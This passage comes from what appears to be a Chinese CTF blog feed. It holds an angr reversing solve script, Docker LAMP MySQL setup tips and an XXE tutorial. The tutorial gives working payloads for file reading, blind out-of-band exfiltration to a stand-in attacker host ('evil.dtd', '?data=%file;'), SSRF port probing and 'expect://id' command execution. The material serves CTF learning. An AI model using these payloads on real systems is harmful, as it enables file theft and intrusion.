src="https://s2.ax1x.com/2020/02/22/3QXn5q.png" alt="3QXn5q.png"></p><p>于是我们可以用脚本进行自动化分析计算，看看怎样输入才能达到输出 <code>Congratulations!</code>的目的。</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><br>proj = angr.Project(<span class="hljs-string">&quot;xor&quot;</span>)<br>simgr = proj.factory.simgr()<br>simgr.explore(find=<span class="hljs-keyword">lambda</span> s: <span class="hljs-string">b&quot;Congratulations!&quot;</span> <span class="hljs-keyword">in</span> s.posix.dumps(<span class="hljs-number">1</span>))<br><span class="hljs-built_in">print</span>(simgr.found[<span class="hljs-number">0</span>].posix.dumps(<span class="hljs-number">0</span>))<br></code></pre></td></tr></table></figure><p>运行结果:</p><p><img src="https://s2.ax1x.com/2020/02/22/3QXeVs.jpg" alt="3QXeVs.jpg"></p><h1 id="解决-CTF-中的题目"><a href="#解决-CTF-中的题目" class="headerlink" title="解决 CTF 中的题目"></a>解决 CTF 中的题目</h1><h2 id="CSAW-CTF-2015-Quals-Reversing-500-“wyvern”"><a href="#CSAW-CTF-2015-Quals-Reversing-500-“wyvern”" class="headerlink" title="CSAW CTF 2015 Quals - Reversing 500, “wyvern”"></a>CSAW CTF 2015 Quals - Reversing 500, “wyvern”</h2><p>Binary File in <a href="https://github.com/angr/angr-doc/blob/master/examples/csaw_wyvern/wyvern">Here</a></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># coding: utf-8</span><br><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment"># Load the binary. This is a 64-bit C++ binary, pretty heavily obfuscated.</span><br>    <span class="hljs-comment"># its correct emulation by angr depends heavily on the libraries it is loaded with,</span><br>    <span class="hljs-comment"># so if this script fails, try copying to this dir the .so files from our binaries repo:</span><br>    <span class="hljs-comment"># https://github.com/angr/binaries/tree/master/tests/x86_64</span><br>    p = angr.Project(<span class="hljs-string">&#x27;wyvern&#x27;</span>)<br><br>    <span class="hljs-comment"># It&#x27;s reasonably easy to tell from looking at the program in IDA that the key will</span><br>    <span class="hljs-comment"># be 29 bytes long, and the last byte is a newline. Let&#x27;s construct a value of several</span><br>    <span class="hljs-comment"># symbols that we can add constraints on once we have a state.</span><br><br>    flag_chars = [claripy.BVS(<span class="hljs-string">&#x27;flag_%d&#x27;</span> % i, <span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">28</span>)]<br>    flag = claripy.Concat(*flag_chars + [claripy.BVV(<span class="hljs-string">b&#x27;\n&#x27;</span>)])<br><br>    <span class="hljs-comment"># This block constructs the initial program state for analysis.</span><br>    <span class="hljs-comment"># Because we&#x27;re going to have to step deep into the C++ standard libraries</span><br>    <span class="hljs-comment"># for this to work, we need to run everyone&#x27;s initializers. The full_init_state</span><br>    <span class="hljs-comment"># will do that. In order to do this peformantly, we will use the unicorn engine!</span><br>    st = p.factory.full_init_state(<br>            args=[<span class="hljs-string">&#x27;./wyvern&#x27;</span>],<br>            add_options=angr.options.unicorn,<br>            stdin=flag,<br>    )<br><br>    <span class="hljs-comment"># Constrain the first 28 bytes to be non-null and non-newline:</span><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> flag_chars:<br>        st.solver.add(k != <span class="hljs-number">0</span>)<br>        st.solver.add(k != <span class="hljs-number">10</span>)<br><br>    <span class="hljs-comment"># Construct a SimulationManager to perform symbolic execution.</span><br>    <span class="hljs-comment"># Step until there is nothing left to be stepped.</span><br>    sm = p.factory.simulation_manager(st)<br>    sm.run()<br><br>    <span class="hljs-comment"># Get the stdout of every path that reached an exit syscall. The flag should be in one of these!</span><br>    out = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> pp <span class="hljs-keyword">in</span> sm.deadended:<br>        out = pp.posix.dumps(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#123;&#x27;</span> <span class="hljs-keyword">in</span> out:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">next</span>(<span class="hljs-built_in">filter</span>(<span class="hljs-keyword">lambda</span> s: <span class="hljs-string">b&#x27;flag&#123;&#x27;</span> <span class="hljs-keyword">in</span> s, out.split()))<br><br>    <span class="hljs-comment"># Runs in about 15 minutes!</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>():<br>    <span class="hljs-keyword">assert</span> main() == <span class="hljs-string">b&#x27;flag&#123;dr4g0n_or_p4tric1an_it5_LLVM&#125;&#x27;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    before = time.time()<br>    <span class="hljs-built_in">print</span>(main())<br>    after = time.time()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Time elapsed: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(after - before))<br></code></pre></td></tr></table></figure><p>如何使用 angr 解决 CTF 的题目，详细参考官方文档的例子：</p><p><a href="http://docs.angr.io/docs/examples.html">Examples using angr to solve CTF challenges</a></p><h1 id="挖坑-TO-DO"><a href="#挖坑-TO-DO" class="headerlink" title="挖坑 TO-DO"></a>挖坑 TO-DO</h1><p>To be continue…</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker_lamp环境下mysql启动问题</title>
    <link href="/2020/02/18/issue_with_docker_lampmysql/"/>
    <url>/2020/02/18/issue_with_docker_lampmysql/</url>
    
    <content type="html"><![CDATA[<h1 id="tutum-x2F-lamp"><a href="#tutum-x2F-lamp" class="headerlink" title="tutum&#x2F;lamp"></a>tutum&#x2F;lamp</h1><p>tutum&#x2F;lamp 用来搭建ctf的web环境可以说是非常方便，但是最近给校赛出sql题目的时候发现一些lamp环境的问题，目前只尝试了linode和tutum的镜像。在tutum&#x2F;lamp下，直接运行mysql是会报错</p><p><code>ERROR 2002 (HY000): Can&#39;t connect to local MySQL server through socket &#39;/var/run/mysqld/mysqld.sock&#39;</code></p><p>一开始尝试遍了网上的各种方法，因为我用的全是原生态的tutum&#x2F;lamp，没有改动，按理说别人能运行我也能，这里只说我碰到情况的解决方法。</p><p>其实mysql一开始并没有打开，我们执行<code>service mysql start </code>会发现执行fail，我们cd到根目录下，可以看到<code>run.sh</code>，<code>create_mysql_admin_user.sh</code>，<code>start-mysqld.sh</code>，我cat了一下run.sh可以看到是对mysql的环境进行配置，所以只需要<code>./run.sh</code>去配置一下就可以了，输出日志会有admin账户的密码，要注意一下，使用root账户也行，密码是空，但是仅限<code>local connection</code>，对于出题来说也足够了。</p><h1 id="linode-x2F-lamp"><a href="#linode-x2F-lamp" class="headerlink" title="linode&#x2F;lamp"></a>linode&#x2F;lamp</h1><p>linode&#x2F;lamp就没有那么多写好的sh脚本了，这个问题参考了<a href="https://blog.csdn.net/lmss82/article/details/4414178">一篇博客的方案5</a>。</p><blockquote><p>摘要：解决不能通过mysql.sock连接MySQL问题<br>这个问题主要提示是，不能通过 ‘&#x2F;tmp&#x2F;mysql.sock’，但是一些mysql安装方法mysql.sock放在&#x2F;var&#x2F;lib&#x2F;mysql.sock或者其他的什么地方，你可以通过修改&#x2F;etc&#x2F;my.cnf文件来修正它，打开文件，可以看到如下：</p><p>[mysqld]<br>socket&#x3D;&#x2F;var&#x2F;lib&#x2F;mysql.sock<br>改一下就好了，但也会引起其他的问题，如mysql程序连不上了，再加一点：<br>[mysql]<br>socket&#x3D;&#x2F;tmp&#x2F;mysql.sock<br>或者还可以通过修改php.ini中的配置来使php用其他的mysql.sock来连，这个大家自己去找找<br>　　<br>或者用这样的方法:<br>ln -s &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;mysql.sock &#x2F;tmp&#x2F;mysql.sock</p></blockquote><p>然后进行 <code>service mysql start</code> 就启动了，注意这里的mysql的root初始密码是<code>Admin2015</code>。</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XXE 基础汇总</title>
    <link href="/2020/02/13/xxe_basic/"/>
    <url>/2020/02/13/xxe_basic/</url>
    
    <content type="html"><![CDATA[<h1 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h1><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p>即 可扩展标记语言（Extensible Markup Language），是一种标记语言，其标签没有预定义，您需要自行定义标签，是W3C的推荐标准。其于HTML的区别是：</p><ul><li>HTML 被设计用来显示数据</li><li>XML 被设计用来传输和存储数据</li></ul><p>XML文档结构包括：</p><ul><li>XML声明</li><li>DTD文档类型定义（可选）</li><li>文档元素</li></ul><p>典型的XML文档</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--XML声明--&gt;</span><br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><br><span class="hljs-comment">&lt;!--DTD，这部分可选的--&gt;</span>          <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [ </span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">foo</span> <span class="hljs-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span> &gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-comment">&lt;!--文档元素--&gt;</span>                                                                          <br><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span><br></code></pre></td></tr></table></figure><p>引用 <a href="https://security.tencent.com/index.php/blog/msg/69">TSRC的一篇文章</a> 的图：</p><p><img src="https://s2.ax1x.com/2020/02/13/1OcSx0.png" alt="1OcSx0.png"></p><h2 id="DTD："><a href="#DTD：" class="headerlink" title="DTD："></a>DTD：</h2><p>Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)，由于其支持的数据类型有限，无法对元素或属性的内容进行详细规范，在可读性和可扩展性方面也比不上XML Schema。</p><p>DTD一般认为有两种引用或声明方式：</p><ul><li>1、内部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在XML文档中。</li><li>2、外部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件（.dtd）中。</li></ul><p>DTD实体有以下几种声明方式</p><h3 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE note [<br>    &lt;!ENTITY a &quot;flag&quot;&gt;<br>]&gt;<br>&lt;note&gt;&amp;a&lt;/note&gt;<br>&lt;!-- flag --&gt;<br></code></pre></td></tr></table></figure><h3 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE note&gt; [<br>    &lt;!ENTITY % b &quot;&lt;!ENTITY b1 &quot;wust&quot;&gt;&quot;&gt;<br>    %b;<br>]&gt;<br>&lt;note&gt;&amp;b1&lt;/note&gt;<br>&lt;!-- wust --&gt;<br></code></pre></td></tr></table></figure><ul><li>参数实体用<code>% name</code>申明，引用时用<code>%name;</code>，只能在DTD中申明，DTD中引用。</li><li>其余实体直接用<code>name</code>申明，引用时用<code>&amp;name;</code>，只能在DTD中申明，可在xml文档中引用</li></ul><h3 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE note&gt; [<br>    &lt;!ENTITY c SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;&gt;<br>]&gt;<br>&lt;note&gt;&amp;c&lt;/note&gt;<br>&lt;!-- eW91X25lZWRfYV9ncmlsZnJpZW5k --&gt;<br></code></pre></td></tr></table></figure><p>外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下所示</p><p><img src="https://s2.ax1x.com/2020/02/13/1O6vPs.png" alt="1O6vPs.png"></p><p>上图是默认支持协议，还可以支持其他，如PHP支持的扩展协议有</p><p><img src="https://s2.ax1x.com/2020/02/13/1O6X5j.png" alt="1O6X5j.png"></p><h3 id="外部参数实体"><a href="#外部参数实体" class="headerlink" title="外部参数实体"></a>外部参数实体</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE note&gt; [<br>    &lt;!ENTITY % d SYSTEM &quot;http://ctf.w-ais.cn/xml.dtd&quot;&gt;<br>    %d;<br>]&gt;<br>&lt;note&gt;&amp;d1&lt;/note&gt;<br>&lt;!-- eW91X25lZWRfYV9ncmlsZnJpZW5k --&gt;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!-- http://ctf.w-ais.cn/xml.dtd --&gt;<br>&lt;!ENTITY d1 SYSTEM &quot;data://text/plain;base64,eW91X25lZWRfYV9ncmlsZnJpZW5k&quot;&gt;<br></code></pre></td></tr></table></figure><p><strong>内部声明DTD</strong><br><code>根元素 [元素声明]&gt;</code><br><strong>引用外部DTD</strong><br><code>根元素 SYSTEM &quot;文件名&quot;&gt;</code><br>或者<br><code>根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;</code></p><p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p><p><strong>内部声明实体</strong><br><code>实体名称 &quot;实体的值&quot;&gt;</code></p><p><strong>引用外部实体</strong><br><code>实体名称 SYSTEM &quot;URI&quot;&gt;</code><br>或者<br><code>实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code></p><h1 id="XML外部实体注入-XML-External-Entity"><a href="#XML外部实体注入-XML-External-Entity" class="headerlink" title="XML外部实体注入(XML External Entity)"></a><strong>XML</strong>外部实体注入(XML External Entity)</h1><h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><p>一般xxe利用分为两大场景：有回显和无回显。</p><p>有回显的情况可以直接在页面中看到Payload的执行结果或现象，无回显的情况又称为Blind XXE，可以使用外带数据通道提取数据。</p><h4 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h4><h5 id="恶意引入外部实体"><a href="#恶意引入外部实体" class="headerlink" title="恶意引入外部实体"></a>恶意引入外部实体</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [ </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span> &gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="恶意引入外部参数实体"><a href="#恶意引入外部参数实体" class="headerlink" title="恶意引入外部参数实体"></a>恶意引入外部参数实体</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://vps-ip/payload.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    %file;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h4><p><a href="https://www.freebuf.com/vuls/207639.html">Blind XXE详解与Google CTF一道题分析</a></p><h5 id="OOB-out-of-band"><a href="#OOB-out-of-band" class="headerlink" title="OOB(out-of-band)"></a>OOB(<strong>out-of-band</strong>)</h5><p>先使用php:&#x2F;&#x2F;filter读取目标文件的内容，然后将内容以http请求发送到接受数据的服务器(攻击服务器)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">updateProfile</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=./target.php&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://xxx.xxx.xxx/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    %dtd;</span><br><span class="hljs-meta">    %send;</span><br><span class="hljs-meta">]&gt;</span><br></code></pre></td></tr></table></figure><p>evil.dtd的内容，内部的%号要进行实体编码成<code>&amp;#x25</code>。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">all</span></span><br><span class="hljs-meta">    <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://xxx.xxx.xxx/?data=%file;&#x27;&gt;&quot;</span></span><br><span class="hljs-meta">&gt;</span><br>%all;<br></code></pre></td></tr></table></figure><p>触发XXE攻击后，服务器会把文件内容发送到攻击者网站</p><h5 id="基于报错"><a href="#基于报错" class="headerlink" title="基于报错"></a>基于报错</h5><blockquote><p>基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。<br>所以和OOB的构造方式几乎只有url出不同，其他地方一模一样。</p></blockquote><p>通过引入服务器文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE message [<br>    &lt;!ENTITY % remote SYSTEM &quot;http://vps/xml.dtd&quot;&gt;<br>    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;<br>    %remote;<br>    %send;<br>]&gt;<br>&lt;message&gt;1234&lt;/message&gt;<br></code></pre></td></tr></table></figure><p>xml.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!-- xml.dtd --&gt;<br>&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;file:///hhhhhhh/%file;&#x27;&gt;&quot;&gt;<br>%start;<br></code></pre></td></tr></table></figure><p>通过引入本地文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE message [<br>    &lt;!ENTITY % remote SYSTEM &quot;/usr/share/yelp/dtd/docbookx.dtd&quot;&gt;<br>    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;<br>    &lt;!ENTITY % ISOamso &#x27;<br>        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;<br>        &amp;#x25;eval;<br>        &amp;#x25;send;<br>    &#x27;&gt; <br>    %remote;<br>]&gt;<br>&lt;message&gt;1234&lt;/message&gt;<br></code></pre></td></tr></table></figure><p>第一个调用的参数实体是<code>%remote</code>，在<code>/usr/share/yelp/dtd/docbookx.dtd</code>文件中调用了<code>%ISOamso</code>;在<code>ISOamso</code>定义的实体中相继调用了<code>eval</code>、和<code>send</code>。</p><h2 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造)，说白了就是借助漏洞实现内网探测</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span>        <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [ </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">foo</span> <span class="hljs-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://127.0.0.1/1.txt&quot;</span> &gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">firstname</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">firstname</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">lastname</span>&gt;</span>666<span class="hljs-tag">&lt;/<span class="hljs-name">lastname</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p>当然，这里的127.0.0.1可以替换成任意你想要的内网地址，我们就可以借此实现对内网的探测。和读文件差不多，只不过把URI改成内网机器地址。</p><p>我们也可以探测内网的端口</p><p><img src="https://s2.ax1x.com/2020/02/13/1O6xGn.png" alt="1O6xGn.png"></p><p><img src="https://s2.ax1x.com/2020/02/13/1O6z2q.png" alt="1O6z2q.png"></p><p>探测192.168.1.1的80、81端口，通过返回的“Connection refused”可以知道该81端口是closed的，而80端口是open的。</p><h2 id="RCE-远程命令执行-Remote-Command-x2F-Code-Execute"><a href="#RCE-远程命令执行-Remote-Command-x2F-Code-Execute" class="headerlink" title="RCE(远程命令执行 Remote Command&#x2F;Code Execute)"></a>RCE(远程命令执行 Remote Command&#x2F;Code Execute)</h2><p>这种情况很少见，并不是传统意义上的任意命令执行，只是因为环境的特殊配置，导致XML与某些命令操作关联，进而造成了命令执行。即有些情况下攻击者能够通过XXE执行代码，这主要是由于配置不当&#x2F;开发内部应用导致的。如果我们足够幸运，并且PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上，那么我们就可以执行如下的命令：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">GVI</span> [ <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">foo</span> <span class="hljs-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;expect://id&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">catalog</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">core</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;test101&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span>John, Doe<span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>I love XML<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">category</span>&gt;</span>Computers<span class="hljs-tag">&lt;/<span class="hljs-name">category</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>9.99<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">date</span>&gt;</span>2018-10-01<span 